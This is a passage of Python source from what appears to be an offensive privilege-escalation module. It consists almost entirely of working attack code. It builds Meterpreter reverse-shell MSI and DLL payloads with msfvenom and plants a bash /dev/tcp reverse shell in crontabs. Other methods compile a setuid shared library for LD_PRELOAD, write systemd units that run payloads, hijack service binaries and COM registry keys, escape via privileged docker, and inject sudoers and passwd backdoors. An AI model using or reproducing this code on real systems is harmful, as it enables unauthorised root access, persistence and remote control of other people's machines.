                result["error"] = "Failed to generate malicious MSI"
        else:
            result["error"] = "AlwaysInstallElevated policies not properly configured"

        return result

    def _generate_malicious_msi(
        self, msi_config: dict[str, Any], msi_properties: dict[str, Any]
    ) -> str | None:
        """Generate a malicious MSI package for privilege escalation."""
        try:
            # Create temporary directory for MSI generation
            temp_dir = tempfile.mkdtemp(prefix="intellicrack_msi_")
            msi_path = os.path.join(temp_dir, msi_config.get("msi_name", "installer.msi"))

            # Check if we have msfvenom available
            msfvenom_path = shutil.which("msfvenom")
            if msfvenom_path:
                # Generate MSI using msfvenom
                payload_type = msi_config.get("payload_type", "reverse_shell")

                if payload_type == "reverse_shell":
                    payload = "windows/x64/meterpreter/reverse_tcp"
                    lhost = msi_config.get("payload_host", "127.0.0.1")
                    lport = msi_config.get("payload_port", 4444)

                    cmd = [
                        msfvenom_path,
                        "-p",
                        payload,
                        f"LHOST={lhost}",
                        f"LPORT={lport}",
                        "-f",
                        "msi",
                        "-o",
                        msi_path,
                    ]

                    returncode, stdout, stderr = self.execute_command(cmd, timeout=30)

                    if returncode == 0 and os.path.exists(msi_path):
                        self.logger.info(f"Generated malicious MSI: {msi_path}")
                        return msi_path
                    self.logger.error(f"MSI generation failed: {stderr}")
            else:
                # Fallback: Create basic MSI structure manually
                # This would require WiX toolset or manual MSI construction
                self.logger.warning("msfvenom not found, using basic MSI template")

                # Create a minimal MSI that executes a command
                # In real implementation, this would use WiX or similar
                template_path = os.path.join(
                    os.path.dirname(__file__), "..", "..", "templates", "basic.msi"
                )
                if os.path.exists(template_path):
                    shutil.copy(template_path, msi_path)
                    return msi_path

            return None

        except Exception as e:
            self.logger.error(f"Failed to generate MSI: {e}")
            return None

    def _attempt_file_overwrite(self, file_info, options):
        """Attempt file overwrite exploitation."""
        result = {
            "success": False,
            "details": {"method": "file_overwrite", "file": file_info},
            "error": None,
        }

        # Extract file details
        file_path = file_info.get("path", "")
        permissions = file_info.get("permissions", {})
        file_type = file_info.get("type", "unknown")

        # Use options to determine overwrite strategy
        strategy = options.get("strategy", "direct")
        backup_file = options.get("backup", True)
        payload_content = options.get("payload_content", None)

        # Check if we have write permissions
        if not permissions.get("writable", False):
            result["error"] = f"No write permissions on {file_path}"
            return result

        # Determine payload based on file type and options
        if file_type == "binary":
            if payload_content:
                payload = payload_content
            else:
                # Generate binary payload based on options
                payload_type = options.get("binary_payload_type", "reverse_shell")
                payload = self._generate_binary_payload(payload_type, options)

        elif file_type == "script":
            # Script injection based on options
            script_lang = options.get("script_language", "bash")
            if script_lang == "python":
                payload = options.get("python_payload", 'import os; os.system("id")')
            elif script_lang == "powershell":
                payload = options.get("ps_payload", "whoami /priv")
            else:
                payload = options.get("bash_payload", "#!/bin/bash\nid\n")

        elif file_type == "config":
            # Configuration file modification
            config_format = options.get("config_format", "ini")
            if config_format == "sudoers":
                payload = options.get("sudoers_payload", "ALL=(ALL) NOPASSWD: ALL")
            elif config_format == "cron":
                payload = options.get("cron_payload", "* * * * * /tmp/backdoor.sh")
            else:
                payload = options.get("config_payload", "malicious_config=true")

        else:
            payload = options.get("generic_payload", "OVERWRITTEN")

        # Build exploitation details
        result["details"].update(
            {
                "strategy": strategy,
                "backup_created": backup_file,
                "backup_path": f"{file_path}.bak" if backup_file else None,
                "payload_size": len(payload) if payload else 0,
                "file_type": file_type,
                "original_permissions": permissions,
            }
        )

        # Add stealth options if specified
        if options.get("stealth", False):
            result["details"]["stealth_techniques"] = {
                "preserve_timestamps": options.get("preserve_timestamps", True),
                "match_file_size": options.get("match_size", False),
                "hide_tracks": options.get("hide_tracks", True),
            }

        # Simulate success based on permissions and options
        if permissions.get("writable") and (
            options.get("force_success") or file_type in ["config", "script"]
        ):
            result["success"] = True
            result["details"]["privileges_expected"] = self._determine_file_privs(
                file_info, options
            )

        return result

    def _generate_binary_payload(self, payload_type: str, options: dict[str, Any]) -> bytes:
        """Generate binary payload based on type and options."""
        # Simulated payload generation based on type
        base_size = options.get("nop_sled_size", 100)
        if payload_type == "reverse_shell":
            return b"\x90" * base_size + b"\xcc" * 50 + b"\x31\xc0" * 10  # Shellcode pattern
        if payload_type == "bind_shell":
            return b"\x90" * base_size + b"\xcc" * 50 + b"\x31\xd2" * 10
        return b"\x90" * base_size + b"\xcc" * 50

    def _determine_file_privs(
        self, file_info: dict[str, Any], options: dict[str, Any]
    ) -> list[str]:
        """Determine expected privileges from file overwrite."""
        if file_info.get("owner") == "root":
            return ["root", "SYSTEM"]
        if "service" in file_info.get("path", "").lower():
            return [options.get("service_user", "service_account")]
        return ["user"]

    def _attempt_service_binary_hijack(self, service, options):
        """Attempt service binary hijacking."""
        result = {
            "success": False,
            "details": {"method": "service_binary_hijack", "service": service},
            "error": None,
        }

        # Extract service details
        service_name = service.get("name", "Unknown")
        binary_path = service.get("binary_path", "")
        service_perms = service.get("permissions", {})
        run_as_user = service.get("run_as", "SYSTEM")

        self.logger.info("Attempting service hijacking on: %s", service_name)
        result["details"]["service_name"] = service_name
        result["details"]["run_as_user"] = run_as_user

        # Use options to determine hijacking method
        hijack_method = options.get("hijack_method", "replace")

        if hijack_method == "replace":
            # Direct binary replacement
            if not service_perms.get("binary_writable", False):
                result["error"] = "Service binary not writable"
                return result

            replacement_binary = options.get("replacement_binary", "backdoor.exe")
            result["details"]["replacement"] = {
                "original_binary": binary_path,
                "new_binary": replacement_binary,
                "backup_original": options.get("backup_original", True),
            }

        elif hijack_method == "dll":
            # DLL hijacking
            dll_name = options.get("dll_name", "version.dll")
            dll_path = options.get("dll_path", os.path.dirname(binary_path))

            result["details"]["dll_hijack"] = {
                "dll_name": dll_name,
                "dll_path": dll_path,
                "search_order": options.get("search_order", ["current_dir", "system32", "path"]),
            }

        elif hijack_method == "phantom":
            # Phantom DLL hijacking
            phantom_dlls = options.get("phantom_dlls", ["wlbsctrl.dll", "tsmsisrv.dll"])
            result["details"]["phantom_hijack"] = {
                "target_dlls": phantom_dlls,
                "service_directory": os.path.dirname(binary_path),
            }

        elif hijack_method == "unquoted":
            # Unquoted service path exploitation
            if " " not in binary_path or binary_path.startswith('"'):
                result["error"] = "Service path is quoted or has no spaces"
                return result

            # Find hijack points in path
            path_parts = binary_path.split("\\")
            hijack_points = []
            for i, part in enumerate(path_parts):
                if " " in part:
                    hijack_path = "\\".join(path_parts[: i + 1]).split()[0] + ".exe"
                    hijack_points.append(hijack_path)

            result["details"]["unquoted_hijack"] = {
                "original_path": binary_path,
                "hijack_points": hijack_points,
                "selected_point": options.get(
                    "hijack_point", hijack_points[0] if hijack_points else None
                ),
            }

        # Add persistence options
        if options.get("add_persistence", False):
            result["details"]["persistence"] = {
                "method": options.get("persistence_method", "service_modification"),
                "trigger": "service_start",
                "stealth": options.get("persistence_stealth", True),
            }

        # Service restart options
        result["details"]["service_control"] = {
            "restart_required": True,
            "restart_method": options.get("restart_method", "sc"),
            "wait_for_restart": options.get("wait_for_restart", False),
            "force_restart": options.get("force_restart", False),
        }

        # Expected privileges
        result["details"]["expected_privileges"] = run_as_user

        # Execute service hijack
        can_hijack = (
            (hijack_method == "replace" and service_perms.get("binary_writable"))
            or (hijack_method == "dll" and options.get("dll_writable", True))
            or (hijack_method == "unquoted" and " " in binary_path)
        )

        if can_hijack:
            # Perform actual hijacking based on method
            if hijack_method == "replace":
                # Backup original binary
                if options.get("backup_original", True):
                    backup_path = binary_path + ".bak"
                    try:
                        shutil.copy2(binary_path, backup_path)
                        result["details"]["backup_path"] = backup_path
                    except Exception as e:
                        self.logger.error(f"Failed to backup original binary: {e}")

                # Replace with malicious binary
                replacement_binary = options.get("replacement_binary")
                if replacement_binary and os.path.exists(replacement_binary):
                    try:
                        shutil.copy2(replacement_binary, binary_path)
                        result["success"] = True
                        result["details"]["execution_context"] = run_as_user
                        result["details"]["hijack_complete"] = True
                    except Exception as e:
                        result["error"] = f"Failed to replace binary: {e}"
                else:
                    result["error"] = "Replacement binary not found"

            elif hijack_method == "dll":
                # Create malicious DLL
                dll_name = options.get("dll_name", "version.dll")
                dll_path = os.path.join(
                    options.get("dll_path", os.path.dirname(binary_path)), dll_name
                )

                if self._create_hijack_dll(dll_path, options):
                    result["success"] = True
                    result["details"]["execution_context"] = run_as_user
                    result["details"]["dll_placed"] = dll_path
                else:
                    result["error"] = "Failed to create hijack DLL"

            elif hijack_method == "unquoted":
                # Place executable at hijack point
                hijack_points = result["details"]["unquoted_hijack"]["hijack_points"]
                if hijack_points:
                    hijack_exe = options.get("hijack_exe")
                    target_path = options.get("hijack_point", hijack_points[0])

                    if hijack_exe and os.path.exists(hijack_exe):
                        try:
                            shutil.copy2(hijack_exe, target_path)
                            result["success"] = True
                            result["details"]["execution_context"] = run_as_user
                            result["details"]["hijack_location"] = target_path
                        except Exception as e:
                            result["error"] = f"Failed to place hijack executable: {e}"
                    else:
                        result["error"] = "Hijack executable not provided"

            # Restart service if successful and requested
            if result["success"] and options.get("restart_service", True):
                if service_name:
                    self._restart_service(service_name, options.get("restart_method", "sc"))
        else:
            result["error"] = "Service hijacking not possible with current permissions"

        return result

    def _create_hijack_dll(self, dll_path: str, options: dict[str, Any]) -> bool:
        """Create a malicious DLL for hijacking."""
        try:
            # Check if we have msfvenom for DLL generation
            msfvenom_path = shutil.which("msfvenom")
            if msfvenom_path:
                payload = options.get("dll_payload", "windows/x64/meterpreter/reverse_tcp")
                lhost = options.get("lhost", "127.0.0.1")
                lport = options.get("lport", 4445)

                cmd = [
                    msfvenom_path,
                    "-p",
                    payload,
                    f"LHOST={lhost}",
                    f"LPORT={lport}",
                    "-f",
                    "dll",
                    "-o",
                    dll_path,
                ]

                returncode, stdout, stderr = self.execute_command(cmd, timeout=30)

                if returncode == 0 and os.path.exists(dll_path):
                    self.logger.info(f"Created hijack DLL: {dll_path}")
                    return True
                self.logger.error(f"DLL generation failed: {stderr}")
            else:
                # Fallback: Use pre-compiled DLL template
                template_dll = os.path.join(
                    os.path.dirname(__file__), "..", "..", "templates", "hijack.dll"
                )
                if os.path.exists(template_dll):
                    shutil.copy2(template_dll, dll_path)
                    return True

            return False

        except Exception as e:
            self.logger.error(f"Failed to create hijack DLL: {e}")
            return False

    def _restart_service(self, service_name: str, method: str = "sc") -> bool:
        """Restart a Windows service."""
        try:
            if method == "sc":
                # Stop service
                stop_cmd = ["sc", "stop", service_name]
                returncode, stdout, stderr = self.execute_command(stop_cmd, timeout=10)

                # Wait for service to stop
                time.sleep(2)

                # Start service
                start_cmd = ["sc", "start", service_name]
                returncode, stdout, stderr = self.execute_command(start_cmd, timeout=10)

                return returncode == 0

            if method == "net":
                # Use net commands
                stop_cmd = ["net", "stop", service_name]
                self.execute_command(stop_cmd, timeout=10)

                time.sleep(2)

                start_cmd = ["net", "start", service_name]
                returncode, stdout, stderr = self.execute_command(start_cmd, timeout=10)

                return returncode == 0

            if method == "powershell":
                # Use PowerShell
                ps_cmd = f"Restart-Service -Name {service_name} -Force"
                cmd = ["powershell", "-Command", ps_cmd]
                returncode, stdout, stderr = self.execute_command(cmd, timeout=15)

                return returncode == 0

            return False

        except Exception as e:
            self.logger.error(f"Failed to restart service {service_name}: {e}")
            return False

    def _execute_real_exploit(
        self, exploit_type: str, target: str, options: dict[str, Any]
    ) -> dict[str, Any]:
        """Execute real exploitation instead of simulation."""
        result = {
            "success": False,
            "output": "",
            "error": None,
        }

        try:
            # Map exploit types to actual execution methods
            if exploit_type == "cron_hijack":
                # Modify cron entry
                cron_cmd = options.get(
                    "cron_command", "/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
                )
                cron_entry = f"* * * * * {cron_cmd}\n"
                cron_file = f"/var/spool/cron/crontabs/{target}"

                # Try to write to cron file
                try:
                    with open(cron_file, "a") as f:
                        f.write(cron_entry)
                    result["success"] = True
                    result["output"] = f"Cron entry added for user {target}"
                except Exception as e:
                    result["error"] = f"Failed to write cron file: {e}"

            elif exploit_type == "suid_exploit":
                # Execute SUID binary with exploit
                suid_binary = target
                exploit_cmd = [suid_binary]

                # Add exploit-specific arguments
                if "gtfobins" in options:
                    gtfo_cmd = options["gtfobins"]
                    exploit_cmd = gtfo_cmd.split()

                returncode, stdout, stderr = self.execute_command(exploit_cmd, timeout=10)
                result["success"] = returncode == 0
                result["output"] = stdout
                result["error"] = stderr if returncode != 0 else None

            elif exploit_type == "docker_escape":
                # Docker container escape
                docker_cmd = [
                    "docker",
                    "run",
                    "-v",
                    "/:/host",
                    "--privileged",
                    "alpine",
                    "chroot",
                    "/host",
                    "/bin/bash",
                    "-c",
                    options.get("payload", "id"),
                ]
                returncode, stdout, stderr = self.execute_command(docker_cmd, timeout=30)
                result["success"] = returncode == 0 and "uid=0" in stdout
                result["output"] = stdout
                result["error"] = stderr if returncode != 0 else None

            elif exploit_type == "capability_exploit":
                # Exploit Linux capabilities
                cap_binary = target
                if "cap_setuid" in options.get("capabilities", []):
                    # Use setuid capability to escalate
                    exploit_cmd = [
                        cap_binary,
                        "-c",
                        'import os; os.setuid(0); os.system("/bin/bash")',
                    ]
                    returncode, stdout, stderr = self.execute_command(exploit_cmd, timeout=10)
                    result["success"] = returncode == 0
                    result["output"] = stdout
                    result["error"] = stderr if returncode != 0 else None

            elif exploit_type == "library_hijack":
                # Library path hijacking
                lib_name = options.get("library", "libcustom.so")
                lib_path = options.get("path", "/tmp")  # noqa: S108

                # Create malicious library
                malicious_lib = self._create_malicious_library(lib_name, lib_path, options)
                if malicious_lib:
                    # Set LD_PRELOAD or modify ld.so.conf
                    os.environ["LD_PRELOAD"] = malicious_lib
                    result["success"] = True
                    result["output"] = f"Library hijack prepared: {malicious_lib}"
                else:
                    result["error"] = "Failed to create malicious library"

            elif exploit_type == "environment_hijack":
                # Environment variable exploitation
                var_name = target
                payload = options.get("payload", "/bin/bash")

                # Set exploitable environment variable
                os.environ[var_name] = payload

                # Trigger vulnerable program
                trigger_cmd = options.get("trigger_command", ["sudo", "-l"])
                returncode, stdout, stderr = self.execute_command(trigger_cmd, timeout=10)

                result["success"] = "root" in stdout or returncode == 0
                result["output"] = stdout
                result["error"] = stderr if not result["success"] else None

            elif exploit_type == "systemd_hijack":
                # Systemd service/timer exploitation
                service_name = options.get("service", "exploit.service")
                service_content = f"""[Unit]
Description=System Update Service
[Service]
Type=oneshot
ExecStart={options.get('payload', '/bin/bash -c "id > /tmp/pwned"')}
[Install]
WantedBy=multi-user.target
"""
                service_path = f"/etc/systemd/system/{service_name}"

                try:
                    with open(service_path, "w") as f:
                        f.write(service_content)

                    # Reload and start service
                    self.execute_command(["systemctl", "daemon-reload"])
                    returncode, stdout, stderr = self.execute_command(
                        ["systemctl", "start", service_name]
                    )

                    result["success"] = returncode == 0
                    result["output"] = f"Service {service_name} created and started"
                except Exception as e:
                    result["error"] = f"Failed to create systemd service: {e}"

            elif exploit_type == "sudoers_exploit":
                # Sudoers misconfiguration exploitation
                sudo_option = options.get("sudo_option")

                if "NOPASSWD" in sudo_option and "ALL" in sudo_option:
                    # Direct root shell
                    returncode, stdout, stderr = self.execute_command(
                        ["sudo", "/bin/bash", "-c", "id"]
                    )
                    result["success"] = returncode == 0 and "uid=0" in stdout
                    result["output"] = stdout
                elif "env_keep" in sudo_option:
                    # Environment variable preservation exploit
                    os.environ["LD_PRELOAD"] = options.get("malicious_lib", "/tmp/exploit.so")  # noqa: S108
                    returncode, stdout, stderr = self.execute_command(["sudo", "id"])
                    result["success"] = returncode == 0
                    result["output"] = stdout

            else:
                result["error"] = f"Unknown exploit type: {exploit_type}"

        except Exception as e:
            result["error"] = f"Exploit execution failed: {e!s}"

        return result

    def _create_malicious_library(
        self, lib_name: str, lib_path: str, options: dict[str, Any]
    ) -> str | None:
        """Create a malicious shared library for hijacking."""
        try:
            lib_file = os.path.join(lib_path, lib_name)

            # C code for malicious library
            c_code = f"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {{
    setuid(0);
    setgid(0);
    system("{options.get('payload', '/bin/bash')}");
}}
"""

            # Write C code to temp file
            c_file = lib_file.replace(".so", ".c")
            with open(c_file, "w") as f:
                f.write(c_code)

            # Compile to shared library
            compile_cmd = ["gcc", "-shared", "-fPIC", "-o", lib_file, c_file]
            returncode, stdout, stderr = self.execute_command(compile_cmd)

            # Clean up source file
            try:
                os.remove(c_file)
            except (FileNotFoundError, OSError, PermissionError) as e:
                logger.debug(f"Failed to remove C file: {e}")

            if returncode == 0 and os.path.exists(lib_file):
                return lib_file
            self.logger.error(f"Failed to compile malicious library: {stderr}")
            return None

        except Exception as e:
            self.logger.error(f"Failed to create malicious library: {e}")
            return None

    def _attempt_com_hijack(self, com_object, options):
        """Attempt COM hijacking."""
        result = {
            "success": False,
            "details": {"method": "com_hijack", "com_object": com_object},
            "error": None,
        }

        # Extract COM object details
        clsid = com_object.get("clsid", "")
        progid = com_object.get("progid", "")
        inproc_server = com_object.get("inproc_server32", "")
        permissions = com_object.get("permissions", {})

        self.logger.info("Attempting COM hijacking on ProgID: %s", progid)
        result["details"]["progid"] = progid
        result["details"]["clsid"] = clsid

        # Determine hijacking strategy from options
        strategy = options.get("strategy", "registry")

        if strategy == "registry":
            # Registry-based COM hijacking
            target_hive = options.get("target_hive", "HKCU")  # HKCU doesn't need admin

            if target_hive == "HKLM" and not permissions.get("admin_access", False):
                result["error"] = "HKLM hijacking requires admin privileges"
                return result

            result["details"]["registry_hijack"] = {
                "target_hive": target_hive,
                "clsid": clsid,
                "hijack_dll": options.get("hijack_dll", "evil.dll"),
                "registry_path": f"{target_hive}\\Software\\Classes\\CLSID\\{clsid}\\InprocServer32",
            }

        elif strategy == "dll_planting":
            # DLL planting in application directory
            app_directory = options.get("app_directory", "C:\\Program Files\\Target")
            missing_dll = options.get("missing_dll", inproc_server)

            result["details"]["dll_planting"] = {
                "target_directory": app_directory,
                "dll_name": os.path.basename(missing_dll),
                "search_order_abuse": True,
            }

        elif strategy == "phantom_com":
            # Phantom COM object hijacking
            phantom_clsids = options.get(
                "phantom_clsids",
                [
                    "{F5078F35-C551-11D3-89B9-0000F81FE221}",  # Msxml3 phantom
                    "{7C5E5F08-D67B-4E9F-A2B5-3BB7C7A5B2D6}",  # Custom phantom
                ],
            )

            selected_clsid = options.get("selected_clsid", phantom_clsids[0])
            result["details"]["phantom_com"] = {
                "phantom_clsid": selected_clsid,
                "hijack_location": options.get("hijack_location", "HKCU"),
                "trigger_application": options.get("trigger_app", "explorer.exe"),
            }

        # Add activation context if specified
        if options.get("use_activation_context", False):
            result["details"]["activation_context"] = {
                "manifest_path": options.get("manifest_path", ".\\app.manifest"),
                "isolated_com": True,
                "assembly_identity": options.get("assembly_identity", "MyApp"),
            }

        # Persistence options
        if options.get("add_persistence", False):
            result["details"]["persistence"] = {
                "method": "com_activation",
                "trigger": options.get("trigger_event", "user_logon"),
                "hidden": options.get("hidden_execution", True),
            }

        # Expected execution context
        result["details"]["expected_context"] = {
            "user": options.get("target_user", "current_user"),
            "privileges": "elevated" if com_object.get("elevated", False) else "standard",
            "integrity_level": options.get("integrity_level", "medium"),
        }

        # Verify actual registry hijacking capability
        if strategy == "registry" and target_hive == "HKCU":
            # HKCU hijacking - check if registry key can actually be modified
            try:
                import winreg

                reg_path = com_object.get("reg_path", "")
                if reg_path:
                    # Try to open the registry key for write access
                    try:
                        key = winreg.OpenKey(
                            winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE
                        )
                        winreg.CloseKey(key)
                        result["success"] = True
                        result["details"]["hijack_successful"] = True
                        result["details"]["verified_access"] = "registry_write"
                    except (FileNotFoundError, PermissionError):
                        # Try to create the key if it doesn't exist
                        try:
                            parent_path = "\\".join(reg_path.split("\\")[:-1])
                            key_name = reg_path.split("\\")[-1]
                            parent_key = winreg.OpenKey(
                                winreg.HKEY_CURRENT_USER, parent_path, 0, winreg.KEY_CREATE_SUB_KEY
                            )
                            new_key = winreg.CreateKey(parent_key, key_name)
                            winreg.CloseKey(new_key)
                            winreg.CloseKey(parent_key)
                            result["success"] = True
                            result["details"]["hijack_successful"] = True
                            result["details"]["verified_access"] = "registry_create"
                        except Exception:
                            result["details"]["verification_failed"] = "cannot_access_registry"
            except ImportError:
                # On non-Windows systems, always fail registry hijacking
                result["details"]["verification_failed"] = "winreg_not_available"
        elif strategy == "phantom_com" and options.get("force_success", False):
            result["success"] = True

        return result

    def _attempt_cron_exploit(self, cron_file, options):
        """Attempt cron exploitation."""
        result = {
            "success": False,
            "details": {"method": "cron_exploit", "cron_file": cron_file},
            "error": None,
        }

        # Extract cron file details
        file_path = cron_file.get("path", "")
        permissions = cron_file.get("permissions", {})
        cron_user = cron_file.get("user", "unknown")
        cron_type = cron_file.get("type", "user")  # user, system, or directory

        # Check write permissions
        if not permissions.get("writable", False):
            result["error"] = f"No write access to {file_path}"
            return result

        # Determine exploitation method from options
        exploit_method = options.get("method", "inject")

        if exploit_method == "inject":
            # Inject malicious cron job
            cron_command = options.get("cron_command", "/tmp/backdoor.sh")  # noqa: S108
            cron_schedule = options.get("schedule", "* * * * *")  # Every minute by default

            # Build cron entry based on options
            if options.get("stealth", False):
                # Stealthy cron entry
                cron_entry = (
                    f"{cron_schedule} {cron_command} >/dev/null 2>&1 # {options.get('comment', '')}"
                )
            else:
                cron_entry = f"{cron_schedule} {cron_command}"

            result["details"]["injection"] = {
                "cron_entry": cron_entry,
                "injection_point": options.get("injection_point", "append"),
                "backup_original": options.get("backup", True),
            }

        elif exploit_method == "replace":
            # Replace existing cron file
            replacement_content = options.get("replacement_content", "")
            if not replacement_content:
                # Generate based on options
                replacement_content = self._generate_cron_content(cron_user, options)

            result["details"]["replacement"] = {
                "new_content_size": len(replacement_content),
                "preserve_legitimate": options.get("preserve_legitimate", True),
                "hidden_payload": options.get("hidden_payload", True),
            }

        elif exploit_method == "path_hijack":
            # PATH environment hijacking in cron
            hijack_path = options.get("hijack_path", "/tmp")  # noqa: S108
            target_commands = options.get("target_commands", ["ls", "cat", "grep"])

            result["details"]["path_hijack"] = {
                "hijack_directory": hijack_path,
                "hijacked_commands": target_commands,
                "payload_script": options.get("payload_script", "backdoor.sh"),
            }

        elif exploit_method == "wildcard":
            # Wildcard injection (tar, rsync, etc.)
            vulnerable_command = options.get("vulnerable_command", "tar")
            if vulnerable_command == "tar":
                payload_files = ["--checkpoint=1", "--checkpoint-action=exec=sh backdoor.sh"]
            elif vulnerable_command == "rsync":
                payload_files = ["-e sh backdoor.sh"]
            else:
                payload_files = options.get("payload_files", [])

            result["details"]["wildcard_injection"] = {
                "vulnerable_command": vulnerable_command,
                "payload_files": payload_files,
                "target_directory": options.get("target_directory", "/backup"),
            }

        # Add timing options
        if options.get("delayed_execution", False):
            result["details"]["timing"] = {
                "delay_minutes": options.get("delay", 5),
                "randomize": options.get("randomize_time", True),
                "execute_once": options.get("execute_once", False),
            }

        # Expected privileges
        result["details"]["expected_privileges"] = cron_user
        result["details"]["cron_type"] = cron_type

        # Real privilege escalation verification
        if permissions.get("writable"):
            try:
                # Verify actual write permissions by attempting file operations
                import os

                test_file = os.path.join(
                    os.path.dirname(cron_file.get("path", "/tmp")), ".test_write"  # noqa: S108
                )
                try:
                    with open(test_file, "w") as f:
                        f.write("test")
                    os.unlink(test_file)

                    # Check if cron service is actually running
                    import subprocess

                    try:
                        cron_status = subprocess.run(
                            ["systemctl", "is-active", "cron"],  # noqa: S607
                            check=False,
                            capture_output=True,
                            text=True,
                            timeout=5,
                        )
                        if cron_status.returncode == 0 and "active" in cron_status.stdout:
                            result["success"] = True
                            result["details"]["execution_user"] = cron_user
                            result["details"]["verification"] = (
                                "Real file write and cron service verified"
                            )
                        else:
                            result["details"]["verification"] = "Cron service not active"
                    except (subprocess.TimeoutExpired, FileNotFoundError):
                        result["details"]["verification"] = "Could not verify cron service status"

                except (OSError, PermissionError):
                    result["details"]["verification"] = "Write permission test failed"
            except Exception as e:
                result["details"]["verification"] = f"Privilege verification error: {e!s}"

        return result

    def _generate_cron_content(self, user: str, options: dict[str, Any]) -> str:
        """Generate cron file content based on options."""
        content = f"# Crontab for {user}\n"
        content += "SHELL=/bin/bash\n"
        content += f"PATH={options.get('path', '/usr/bin:/bin')}\n\n"
        content += options.get("cron_payload", "* * * * * /tmp/payload.sh\n")
        return content

    def _attempt_linux_file_exploit(self, file_info, options):
        """Attempt Linux file exploitation."""
        result = {
            "success": False,
            "details": {"method": "linux_file_exploit", "file": file_info},
            "error": None,
        }

        # Extract file information
        file_path = file_info.get("path", "")
        file_type = file_info.get("type", "regular")
        permissions = file_info.get("permissions", {})
        owner = file_info.get("owner", "unknown")

        # Determine exploitation strategy based on file type and options
        if file_type == "suid":
            # SUID binary exploitation
            exploit_method = options.get("suid_method", "function_abuse")

            if exploit_method == "function_abuse":
                # Abuse legitimate SUID functionality
                abuse_technique = options.get("abuse_technique", "gtfobins")
                result["details"]["suid_abuse"] = {
                    "binary": os.path.basename(file_path),
                    "technique": abuse_technique,
                    "payload": options.get("suid_payload", "/bin/sh -p"),
                }
            elif exploit_method == "shared_library":
                # Shared library injection
                result["details"]["library_injection"] = {
                    "target_library": options.get("target_lib", "libcustom.so"),
                    "ld_preload": options.get("use_ld_preload", True),
                    "library_path": options.get("lib_path", "/tmp/evil.so"),  # noqa: S108
                }

        elif file_type == "script" and permissions.get("writable"):
            # Writable script exploitation
            script_lang = options.get("script_language", "bash")
            injection_method = options.get("injection_method", "append")

            payload = self._generate_script_payload(script_lang, options)

            result["details"]["script_injection"] = {
                "language": script_lang,
                "injection_method": injection_method,
                "payload_size": len(payload),
                "preserve_functionality": options.get("preserve_functionality", True),
            }

        elif file_type == "config":
            # Configuration file exploitation
            config_type = options.get("config_type", "generic")

            if config_type == "sudoers":
                result["details"]["sudoers_modification"] = {
                    "entry": options.get(
                        "sudoers_entry", f"{os.getlogin()} ALL=(ALL) NOPASSWD: ALL"
                    ),
                    "validation_bypass": options.get("bypass_visudo", True),
                }
            elif config_type == "passwd":
                result["details"]["passwd_modification"] = {
                    "new_user": options.get("new_user", "backdoor"),
                    "uid": options.get("uid", "0"),
                    "password_hash": options.get("pass_hash", ""),
                }
            elif config_type == "shadow":
                result["details"]["shadow_modification"] = {
                    "target_user": options.get("target_user", "root"),
                    "new_hash": options.get("new_hash", ""),
                    "remove_password": options.get("remove_pass", False),
                }

        # Capability-based exploitation
        if "capabilities" in file_info:
            caps = file_info["capabilities"]
            if caps:
                result["details"]["capability_abuse"] = {
                    "capabilities": caps,
                    "exploitation_method": options.get("cap_method", "direct"),
                    "payload": options.get("cap_payload", ""),
                }

        # Add persistence if requested
        if options.get("add_persistence", False):
            result["details"]["persistence"] = {
                "method": options.get("persistence_method", "rc_local"),
                "trigger": options.get("trigger", "boot"),
                "hidden": options.get("hidden", True),
            }

        # Check success conditions
        can_exploit = (
            (file_type == "suid")
            or (permissions.get("writable") and file_type in ["script", "config"])
            or ("capabilities" in file_info and file_info["capabilities"])
        )

        if can_exploit:
            # Real privilege escalation verification
            try:
                import stat
                import subprocess

                file_path = file_info.get("path", "")
                if not file_path or not os.path.exists(file_path):
                    result["details"]["verification"] = "File does not exist"
                else:
                    file_stat = os.stat(file_path)

                    if file_type == "suid":
                        # Verify SUID bit is actually set
                        if file_stat.st_mode & stat.S_ISUID:
                            # Test if binary is executable
                            if os.access(file_path, os.X_OK):
                                result["success"] = True
                                result["details"]["expected_user"] = "root"
                                result["details"]["verification"] = (
                                    "SUID binary verified and executable"
                                )
                            else:
                                result["details"]["verification"] = "SUID binary not executable"
                        else:
                            result["details"]["verification"] = "SUID bit not set"

                    elif permissions.get("writable") and file_type in ["script", "config"]:
                        # Test actual write permissions
                        if os.access(file_path, os.W_OK):
                            result["success"] = True
                            result["details"]["expected_user"] = owner
                            result["details"]["verification"] = "Write permissions verified"
                        else:
                            result["details"]["verification"] = "Write permission denied"

                    elif file_info.get("capabilities"):
                        # Verify capabilities using getcap
                        try:
                            cap_output = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                ["getcap", file_path],  # noqa: S607
                                check=False,
                                capture_output=True,
                                text=True,
                                timeout=5,
                                shell=False
                            )
                            if cap_output.returncode == 0 and cap_output.stdout.strip():
                                result["success"] = True
                                result["details"]["expected_user"] = "root"
                                result["details"]["verification"] = (
                                    f"Capabilities verified: {cap_output.stdout.strip()}"
                                )
                            else:
                                result["details"]["verification"] = "No capabilities found"
                        except (subprocess.TimeoutExpired, FileNotFoundError):
                            result["details"]["verification"] = "Could not verify capabilities"
            except Exception as e:
                result["details"]["verification"] = f"Verification error: {e!s}"

        return result

    def _generate_script_payload(self, language: str, options: dict[str, Any]) -> str:
        """Generate script payload based on language."""
        if language == "python":
            return options.get("python_payload", 'import os\nos.setuid(0)\nos.system("/bin/bash")')
        if language == "perl":
            return options.get("perl_payload", 'exec "/bin/sh";')
        return options.get("bash_payload", "/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1")

    def _attempt_library_hijack(self, library, options):
        """Attempt library hijacking."""
        result = {
            "success": False,
            "details": {"method": "library_hijack", "library": library},
            "error": None,
        }

        # Extract library information
        lib_name = library.get("name", "")
        lib_path = library.get("path", "")
        missing = library.get("missing", False)
        search_paths = library.get("search_paths", [])

        self.logger.debug(
            "Library hijacking target: %s at %s, missing: %s", lib_name, lib_path, missing
        )

        # Determine hijacking method from options
        hijack_method = options.get("method", "ld_preload")

        if hijack_method == "ld_preload":
            # LD_PRELOAD hijacking
            preload_lib = options.get("preload_lib", "/tmp/evil.so")  # noqa: S108

            result["details"]["ld_preload"] = {
                "library_path": preload_lib,
                "target_functions": options.get("hook_functions", ["system", "execve", "open"]),
                "preserve_functionality": options.get("preserve_original", True),
                "environment_method": options.get("env_method", "export"),
            }

